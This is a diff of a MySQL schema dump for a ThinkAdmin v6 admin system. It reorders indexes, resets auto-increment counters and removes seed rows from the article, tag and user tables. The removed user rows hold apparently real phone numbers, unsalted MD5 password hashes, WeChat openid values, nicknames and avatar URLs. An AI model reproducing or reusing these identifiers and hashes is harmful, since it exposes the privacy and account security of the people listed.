@@ -1,17 +1,17 @@
 /*
  Navicat MySQL Data Transfer
 
- Source Server         : thinkadmin.top
+ Source Server         : server.cuci.cc
  Source Server Type    : MySQL
  Source Server Version : 50562
- Source Host           : 127.0.0.1:3306
+ Source Host           : localhost:3306
  Source Schema         : admin_v6
 
  Target Server Type    : MySQL
  Target Server Version : 50562
  File Encoding         : 65001
 
- Date: 24/02/2021 18:05:13
+ Date: 24/02/2021 18:06:08
 */
 
 SET NAMES utf8mb4;
@@ -38,34 +38,14 @@ CREATE TABLE `data_news_item`  (
   `deleted` tinyint(1) NULL DEFAULT 0 COMMENT '删除状态(0未删,1已删)',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
+  INDEX `idx_data_news_item_code`(`code`) USING BTREE,
   INDEX `idx_data_news_item_status`(`status`) USING BTREE,
-  INDEX `idx_data_news_item_deleted`(`deleted`) USING BTREE,
-  INDEX `idx_data_news_item_code`(`code`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 21 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-文章-内容' ROW_FORMAT = COMPACT;
+  INDEX `idx_data_news_item_deleted`(`deleted`) USING BTREE
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-文章-内容' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of data_news_item
 -- ----------------------------
-INSERT INTO `data_news_item` VALUES (1, 'A7104209376795', '测试', ',213,', 'https://v6.thinkadmin.top/upload/d7/cd9a469e2b58783b9f3a3273125d82.jpg', '我去饿我去', '<p>v额哇哇哇哇哇哇哇哇哇哇哇哇哇哇哇哇哇</p>\r\n\r\n<p>大撒大撒大撒啊啊啊啊啊啊啊啊啊啊啊啊啊</p>', 0, 0, 0, 0, 8, 1, 1, '2021-01-12 11:09:54');
-INSERT INTO `data_news_item` VALUES (2, 'A7106240023114', '123', ',we,dfg,asdas,213,', 'https://v6.thinkadmin.top/upload/8c/33f16fc28715486de418c7b9d4f672.png', '1231123', '', 0, 0, 0, 0, 6, 0, 1, '2021-01-14 19:33:38');
-INSERT INTO `data_news_item` VALUES (3, 'A7106240236969', 'hbh', ',213,', 'https://v6.thinkadmin.top/upload/8c/33f16fc28715486de418c7b9d4f672.png', '3123', '<p>12312</p>', 0, 0, 0, 0, 7, 1, 1, '2021-01-14 19:33:50');
-INSERT INTO `data_news_item` VALUES (4, 'A7112225555644', 'car', ',asdas,', 'https://v6.thinkadmin.top/upload/4a/35d837f99b8451fa3b545af1d4b327.jpg', 'car', '<p>car</p>', 0, 0, 0, 0, 14, 1, 0, '2021-01-21 17:49:51');
-INSERT INTO `data_news_item` VALUES (5, 'A7119955596026', 'asdf asdf', ',asdas,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', 'asdfasdfa', '<p>fasdfasfd</p>', 0, 0, 0, 0, 9, 0, 1, '2021-01-30 16:32:50');
-INSERT INTO `data_news_item` VALUES (6, 'A7119955748711', '这里是标题', ',we,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', '这里是简介', '<p>这里是文本内容塔塔</p>', 0, 0, 0, 0, 6, 0, 1, '2021-01-30 16:33:05');
-INSERT INTO `data_news_item` VALUES (7, 'A7119955894271', 'sdfsdf', ',asdas,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', 'sfsfsf', '<p>sfsdfsf</p>', 0, 0, 0, 0, 0, 1, 1, '2021-01-30 16:33:21');
-INSERT INTO `data_news_item` VALUES (8, 'A7119956061367', 'fghfdhgdd', ',asdas,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', 'gdsgsdgsdg', '<p>sgsgsg</p>', 0, 0, 0, 0, 0, 1, 1, '2021-01-30 16:33:41');
-INSERT INTO `data_news_item` VALUES (9, 'A7119956341333', '表单提交成功后，从服务器返回的url在当前tab中展示', ',213,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', '表单提交成功后，从服务器返回的url在当前tab中展示', '<p>表单提交成功后，从服务器返回的url在当前tab中展示akdlf</p>', 0, 0, 0, 0, 0, 1, 1, '2021-01-30 16:34:03');
-INSERT INTO `data_news_item` VALUES (10, 'A7119956468289', '表单提交成功后，从服务器返回的url在当前tab中展示', ',dfg,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', '表单提交成功后，从服务器返回的url在当前tab中展示', '<p>表单提交成功后，从服务器返回的url在当前tab中展示</p>', 0, 0, 0, 0, 0, 0, 1, '2021-01-30 16:34:17');
-INSERT INTO `data_news_item` VALUES (11, 'A7119956611670', '表单提交成功后，从服务器返回的url在当前tab中展示', ',asdas,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', '表单提交成功后，从服务器返回的url在当前tab中展示', '<p>表单提交成功后，从服务器返回的url在当前tab中展示</p>', 0, 0, 0, 0, 0, 1, 1, '2021-01-30 16:34:34');
-INSERT INTO `data_news_item` VALUES (12, 'A7119956783840', '表单提交成功后，从服务器返回的url在当前tab中展示', ',asdas,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', '表单提交成功后，从服务器返回的url在当前tab中展示', '<p>表单提交成功后，从服务器返回的url在当前tab中展示</p>', 0, 0, 0, 0, 0, 1, 1, '2021-01-30 16:34:49');
-INSERT INTO `data_news_item` VALUES (13, 'A7119957203232', '表单提交成功后，从服务器返回的url在当前tab中展示', ',asdas,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', '表单提交成功后，从服务器返回的url在当前tab中展示', '<p>表单提交成功后，从服务器返回的url在当前tab中展示</p>', 0, 0, 0, 0, 0, 1, 1, '2021-01-30 16:35:31');
-INSERT INTO `data_news_item` VALUES (14, 'A7119957374567', '表单提交成功后，从服务器返回的url在当前tab中展示', ',dfg,', 'https://v6.thinkadmin.top/upload/39/6fa0def1255ee9de41d615117ce040.jpg', '表单提交成功后，从服务器返回的url在当前tab中展示', '<p>表单提交成功后，从服务器返回的url在当前tab中展示</p>', 0, 0, 0, 0, 0, 1, 1, '2021-01-30 16:35:52');
-INSERT INTO `data_news_item` VALUES (15, 'A7122812441098', '5441', ',5152,we,dfg,asdas,213,', '51', '51', '<p>26+26+</p>', 0, 0, 0, 0, 0, 1, 1, '2021-02-02 23:54:25');
-INSERT INTO `data_news_item` VALUES (16, 'A7124306192353', '1231', ',dfg,', '123123', '23123', '', 0, 0, 0, 0, 0, 1, 1, '2021-02-04 17:23:54');
-INSERT INTO `data_news_item` VALUES (17, 'A7124399433201', '22', ',123,5152,', 'https://v6.thinkadmin.top/upload/81/066bf29ff4c2570ebfda4a0ff28738.jpg', '2222', '<p>2222222</p>', 0, 0, 0, 0, 0, 1, 1, '2021-02-04 19:59:38');
-INSERT INTO `data_news_item` VALUES (18, 'A7136983180521', 'd', ',dfg,asdas,213,', 'https://v6.thinkadmin.top/upload/8f/8670ef3eeef180cb8c9562de59882f.gif', 'd', '<p>d</p>', 0, 0, 0, 0, 23, 1, 1, '2021-02-19 09:32:05');
-INSERT INTO `data_news_item` VALUES (19, 'A7137084834989', '1111', ',5152,we,dfg,', '1212', '12121212', '<p>1212</p>', 0, 0, 0, 0, 10, 1, 1, '2021-02-19 12:21:54');
-INSERT INTO `data_news_item` VALUES (20, 'A7140754759289', '测试', ',we,', 'https://v6.thinkadmin.top/upload/82/2b1e38bc501383e595e1871d7108b4.png', '测试', '<p>测试</p>', 0, 0, 0, 0, 0, 1, 1, '2021-02-23 18:18:39');
 
 -- ----------------------------
 -- Table structure for data_news_mark
@@ -82,17 +62,11 @@ CREATE TABLE `data_news_mark`  (
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_data_news_mark_status`(`status`) USING BTREE,
   INDEX `idx_data_news_mark_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-文章-标签' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-文章-标签' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of data_news_mark
 -- ----------------------------
-INSERT INTO `data_news_mark` VALUES (1, '213', '', 0, 1, 0, '2021-01-12 11:08:15');
-INSERT INTO `data_news_mark` VALUES (2, 'asdas', '', 0, 1, 0, '2021-01-17 20:05:58');
-INSERT INTO `data_news_mark` VALUES (3, 'dfg', '', 0, 1, 0, '2021-01-18 11:12:46');
-INSERT INTO `data_news_mark` VALUES (4, 'we', '', 0, 1, 0, '2021-01-23 14:51:12');
-INSERT INTO `data_news_mark` VALUES (5, '5152', '', 0, 1, 0, '2021-01-28 18:56:44');
-INSERT INTO `data_news_mark` VALUES (6, '123', '', 0, 1, 1, '2021-02-05 14:41:27');
 
 -- ----------------------------
 -- Table structure for data_news_x_collect
@@ -107,9 +81,9 @@ CREATE TABLE `data_news_x_collect`  (
   `status` tinyint(1) NULL DEFAULT 1 COMMENT '记录状态(0无效,1待审核,2已审核)',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
+  INDEX `idx_data_news_x_collect_mid`(`uid`) USING BTREE,
   INDEX `idx_data_news_x_collect_type`(`type`) USING BTREE,
   INDEX `idx_data_news_x_collect_code`(`code`) USING BTREE,
-  INDEX `idx_data_news_x_collect_mid`(`uid`) USING BTREE,
   INDEX `idx_data_news_x_collect_status`(`status`) USING BTREE
 ) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-文章-标记' ROW_FORMAT = COMPACT;
 
@@ -162,73 +136,18 @@ CREATE TABLE `data_user`  (
   `deleted` tinyint(1) UNSIGNED NULL DEFAULT 0 COMMENT '删除状态(0未删,1已删)',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '注册时间',
   PRIMARY KEY (`id`) USING BTREE,
+  INDEX `idx_data_user_pid1`(`pid1`) USING BTREE,
+  INDEX `idx_data_user_pid2`(`pid2`) USING BTREE,
   INDEX `idx_data_user_status`(`status`) USING BTREE,
   INDEX `idx_data_user_deleted`(`deleted`) USING BTREE,
   INDEX `idx_data_user_openid1`(`openid1`) USING BTREE,
   INDEX `idx_data_user_openid2`(`openid2`) USING BTREE,
-  INDEX `idx_data_user_unionid`(`unionid`) USING BTREE,
-  INDEX `idx_data_user_pid1`(`pid1`) USING BTREE,
-  INDEX `idx_data_user_pid2`(`pid2`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 56 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-会员' ROW_FORMAT = COMPACT;
+  INDEX `idx_data_user_unionid`(`unionid`) USING BTREE
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-会员' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of data_user
 -- ----------------------------
-INSERT INTO `data_user` VALUES (1, 0, 0, '-', 1, '', '', '', '13617348882', '', '', '', 'e10adc3949ba59abbe56e057f20f883e', '', '', '', 0, '', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-12 22:07:30');
-INSERT INTO `data_user` VALUES (2, 0, 0, '-', 1, '', '', '', '13617348881', '', '', '', 'e10adc3949ba59abbe56e057f20f883e', '', '', '', 0, '', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-15 02:53:07');
-INSERT INTO `data_user` VALUES (3, 0, 0, '-', 1, 'odTi05AMTKx5WYgMnnqbtG4MI9Q0', '', '', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/JSmwB5ERvyXDUGib2yIcPwFuZicQWDpB3cnRayRKeW66zZTGStbyhjoj2DM0nuxJAsY7BMz5nXjRne1MImHnrU2A/132', '', 'Anyon', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 17:56:45');
-INSERT INTO `data_user` VALUES (4, 0, 0, '-', 1, '', 'o38gps3vNdCqaggFfrBRCRikwlWY', 'oGsrks8MgmWGcHiTXw8-MVOud_jk', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/hiaKqW4pJbhvTrcRFvo8GicYqYvphb0DU51dia9gGltfibdkhCUibmmpkE4lRjzrHF1LWOPyboGDvdFnMiaBf0N3PMKA/132', '', 'Anyon', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 98.80, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 18:51:24');
-INSERT INTO `data_user` VALUES (5, 0, 0, '-', 1, '', 'o38gps7Shk-J3RKMNo5bBwwvZprE', 'oGsrksys3M-GQcV10446GOAidwbw', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eqGN4Y3IibTapicAX3GRfKQBGcdGCwLL41IH7kXXbOGeLejwYJiazD2giaXa2OCbgpIhty7hMUTUianmUQ/132', '', '丁章泽', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:26');
-INSERT INTO `data_user` VALUES (6, 0, 0, '-', 1, '', 'o38gpsxt3IPhsscYcW2-RKBPCngs', 'oGsrks30M-jSYoANmfgRUqjrbEns', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTI96enm26N5ROKaEYzHyPjHJQgOS6AXEg0zmnApYN13x8cOWSD3nibiaicxGyA2sRjE91zKO7jrZ5ukg/132', '', 'メwenfeng，xuツ', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:28');
-INSERT INTO `data_user` VALUES (7, 0, 0, '-', 1, '', 'o38gps2VbStIxl1y5iGujmk_T63w', 'oGsrks1qsGMHXMWnzprdDRzniqaI', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKcRygMwYWWicPP7nVjINIM8q6bjBgPpdic9glNibUmgSxibwqQ2t1qwKuZmapMZxgj0PWTE0Miaer5BPA/132', '', 'HLW', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:28');
-INSERT INTO `data_user` VALUES (8, 0, 0, '-', 1, '', 'o38gps3MAWu2r-stJzUHllDcIf54', 'oGsrks9BsFImEdl4dLGFkgPqLq1s', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTI6httcVDU2oat1CAiab5lsg7Om0Sc4cMfCmcCNXTa3o4kg2Uf7RI84z9elcRNDK9421ibwBTSdat9A/132', '', 'D`angelo Russell', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:31');
-INSERT INTO `data_user` VALUES (9, 0, 0, '-', 1, '', 'o38gps9lQUwPERa6xZR1dCq_FjRk', 'oGsrksyjW9dK0ZTI_ymiTVpp4bd0', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKAflkqicKNYOGJXmYqyKADibo6sbbUk078WGD4ibicomQbNs8zhF6PyZNt74tWBZGnBhpMFmIGc7N6ww/132', '', 'Jalon', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:39');
-INSERT INTO `data_user` VALUES (10, 0, 0, '-', 1, '', 'o38gpsypwxHqp945_PIfHIU51yZE', 'oGsrks6rTYaDMvCkG6LBCTeOgGow', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKNKRlxIW1XgTl7vmtCQSjbnYd3ScjNcGnO6nSiclyvVibbtkkzSC3WMXusCLPGzpAfNibibGd7R0ToWw/132', '', '因吹斯汀', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:39');
-INSERT INTO `data_user` VALUES (11, 0, 0, '-', 1, '', 'o38gpsw4rkaoGPzbFfCYLpyQbzho', 'oGsrks7E6HsPL32NqhhVJVxxue80', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJZ2cfo2cDUMcX5H6KfJlClz2aFYv3g0F0XyD0kFXn9hAxp2bpha6f0ZicD00olt1ew6f5iaicHEDwAQ/132', '', '那又如何.จุ๊บ', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-20 22:09:43');
-INSERT INTO `data_user` VALUES (12, 0, 0, '-', 1, '', 'o38gps7K_p-A07YnCQ5HnX8KOskY', 'oGsrkswerFlRUVrugU0Na7vKTwTI', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJLrLCPFUY1KsLX0oqD9tWC5ibicL3ibTNlPsibezXiaOEzzzicoXL9JEorLPEHkfcSFor7p0DuyJB9lllg/132', '', '😁 😁', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:52');
-INSERT INTO `data_user` VALUES (13, 0, 0, '-', 1, '', 'o38gps6irNpSzAelDuOuy6KMYet0', 'oGsrks4AynT0L0QP-lD0A7KxPd60', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83er8FrtN9Oz7Sd7FveVUMsNCTZ0tvZ4aoTJkiaoOiazkbiakYZBR8aricsrpnsX5ZjJcwPNzg6KC4iaB1zQ/132', '', '天地极限', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:56');
-INSERT INTO `data_user` VALUES (14, 0, 0, '-', 1, '', 'o38gps8eJZ4fsz7ksYJKGDgpaSuQ', 'oGsrksxFWLKacJaVBK2bDI06S0TE', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/zNbwDmMgWwGDxjzUJMCYicjXo6Bge8bsXKtRkXUYc4Djiaqk2EkQ7YkWGNKEQJItJxvAd9TbWSamOKVkPTWUKy1g/132', '', '诗无尽头i', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:09:57');
-INSERT INTO `data_user` VALUES (15, 0, 0, '-', 1, '', 'o38gps5nnD9ZRcugNUvgz3BVn8Xc', 'oGsrks9dbAZ1TXaUFM06YYDpyBBA', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/ozd838cgVvXW9pZURRjxIc37qwnts7a6OzEBCBcRzVJFUAYNzEYQC8yyhoPozLHQp9qkUvh8tXmbUXzyDaxBicA/132', '', '一寸灰', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:00');
-INSERT INTO `data_user` VALUES (16, 0, 0, '-', 1, '', 'o38gps99eFBSzWHl2hWXrxUQT0nk', 'oGsrks2sB2kdT9CBZQQ8klmBWtyc', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/7hcjadxGAyOaGluTicmnLo9GeL5T2tVcqn5JSxo11QVuzmr2FUPKk1x5vXb9cDhH6SEu5iarA5JKDdibD8PxByxQg/132', '', '风中之岛', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:01');
-INSERT INTO `data_user` VALUES (17, 0, 0, '-', 1, '', 'o38gps80h1Axls0hMUOeT6WBvUPo', 'oGsrkswsksMxZ6yVcn8Oac2a1Wco', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83er4YTKO8XEsmMkwgIEJ7HldmClqvLupVBOvlwUbF5RLrvYkicUpBQ4iaKOtENfR3ZeY9ic5YPcSF9QKw/132', '', '🐻熊二', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:05');
-INSERT INTO `data_user` VALUES (18, 0, 0, '-', 1, '', 'o38gps2DCEuBJkh-5i9kGg7lxNsE', 'oGsrks9Sl2pcIhFCLoXBwxFi5P8w', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/PiajxSqBRaEIMK2jsmzIHUAwgd0vwvqcd9KCHbGiby2zDdn4wydTO7AzGxiafOaVBicyCkxBg6haPBK6PibIm7fEwwQ/132', '', '在路上', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:14');
-INSERT INTO `data_user` VALUES (19, 0, 0, '-', 1, '', 'o38gps4x13iHdMAZ2arjCbmzuLZA', 'oGsrkswbDJQAVI2CNYmmYwrCydGI', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q3auHgzwzM4hqjT2IQZcu1SO89BTnUmrV9sktTiaUIvcuE4t2f1eokrH0wAKKcxvbohWC5xNx9vCrY2mZBDYdew/132', '', '哄哄', '', '', '', '', 0, '未知', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:16');
-INSERT INTO `data_user` VALUES (20, 0, 0, '-', 1, '', 'o38gps9sl31J2YJ8d6WZTH0o8F9A', 'oGsrks6YQRQ2Hi4Ske6uAzUbkpFE', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/oVpXeM8ebKlxz9q7absCibibfjUDCUGKlRUv10s4ZBeN4PicOQtEu0zE1OBsJda16bBZNn2TK2lq66sVnBONdQIdA/132', '', 'γàиɡ楚ㄖ月', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:21');
-INSERT INTO `data_user` VALUES (21, 0, 0, '-', 1, '', 'o38gps_Io4aBgQd7SBeyr8ztP9k8', 'oGsrks-a0-0RUJTSPXaV5rC9ooas', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTI6aLVnbplZbzwtcPLYDjUQiaHIHO5NgYE6QjTSlNkAKjc2sZGan7uR4vh2QnsxJAcVuTXAqv7lgmQ/132', '', 'Smile、XZ', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:22');
-INSERT INTO `data_user` VALUES (22, 0, 0, '-', 1, '', 'o38gps63ZU-QQaOwXRcaGqqGsGSs', 'oGsrks1TY-upRDN9NaWHcudkCiCs', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83ep5jVJo8xg4PiasF1u5nEAHQ6kLH6yicd8GGNgW0XRBFryibuDPWWGWibovR7Riajl3V3Cx0CTkyg3sgOA/132', '', '样儿', '', '', '', '', 0, '女', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-20 22:10:36');
-INSERT INTO `data_user` VALUES (23, 0, 0, '-', 1, '', 'o38gps8bYanBzfAadAd5q2o8EyxE', 'oGsrks_nx-mGbfUCYYDH7A2BlbVU', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKxJcyibpKLnVFcHswjz9e5wWbLrsxZLWEibnA3TNicmvdBo8gpWz6iccAYotqPXwKP4KdP8GYlI14Ssg/132', '', '惊梦', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:10:44');
-INSERT INTO `data_user` VALUES (24, 0, 0, '-', 1, '', 'o38gps8qAga-Owge4vqs4HvJRiTA', 'oGsrks4g8DaU1OMGu3OP9WySU5R4', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/NeeWkLN55sfndmwOVicG8Wx8nrArU18lLOeoMebZnjOatlDdOobRG4Qr8HLF5Ny4N7OiccKyIAvIuj3uKfbWM29A/132', '', 'M', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:11:07');
-INSERT INTO `data_user` VALUES (25, 0, 0, '-', 1, '', 'o38gps0v9z1yonGmcZ67iZewSTOo', 'oGsrks7fwZH4eGskS5CcKDJUWxQ0', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/PiajxSqBRaEKSM6wAJq3fcZYbib4x4Og4Y92RiaKepuCGbdVSB3gSWsibAX8IhYaDNuiaibQgzRw4d6PQQf0x81iccmFg/132', '', 'S.R', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:11:17');
-INSERT INTO `data_user` VALUES (26, 0, 0, '-', 1, '', 'o38gpsxUzKOepgxix1mnaQe3A0N4', 'oGsrks0RY3eiytuk9IDGNxXZlIcE', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/StuksE91uKItGFGdDqNBnQwvkcjDxsiaU2MF0ABlfNWjibLlnMANq47VD8hunGkmCMR4TmyyKw2th82ibOiborXWwA/132', '', '龙witt', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:11:19');
-INSERT INTO `data_user` VALUES (27, 0, 0, '-', 1, '', 'o38gpsxnWQXdTu_Z6OTURSgEu9ME', 'oGsrks_Zlxcw3ZQPlguytza4m3qU', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/PiajxSqBRaEKGGpMtH7E4JjwMibPDoXxxfKrBqB8Z4sOovjyQVazJpSEKoiaHJY1fAdkr5nQvBMMJA6iaReD3c7PfQ/132', '', '江川', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:11:37');
-INSERT INTO `data_user` VALUES (28, 0, 0, '-', 1, '', 'o38gps48wwRZsOy6V1gQvkxGGIJA', 'oGsrks284TmCqCZplCQoHBh7yMuw', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTLhRH6fwgzxM7Ryd5886m1IsyTXmhJtnNpNrxkTf9HxncWeabzZEuC5BMiadibwRibae9R0XyiaaUehJA/132', '', '预见', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:12:08');
-INSERT INTO `data_user` VALUES (29, 0, 0, '-', 1, '', 'o38gps8PHunYyrZV3XchBaHRYeao', 'oGsrksy0VgUjsKtlJFsV2tZVDBqI', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q3auHgzwzM7AVfiaRumazGY7kOMANYnB76GiczESShRWkN25ShicicPTREl3Fr4Ngt6liaiatuc2ZKOziaIvxgtvrY5Bg/132', '', '神经蛙', '', '', '', '', 0, '未知', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:13:25');
-INSERT INTO `data_user` VALUES (30, 0, 0, '-', 1, '', 'o38gpswRVMNRb2t9XhQ45OB_EU0M', 'oGsrks1uU0TYxEiHnqGtULWKhT_8', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83epW1MiaFR2RTuxe6alibd0eSEKANiatgM60LBzEKNOUvgtw4sGvDRtVWr55OOre5b6HjuNFeictfqegWQ/132', '', '🍋', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:13:50');
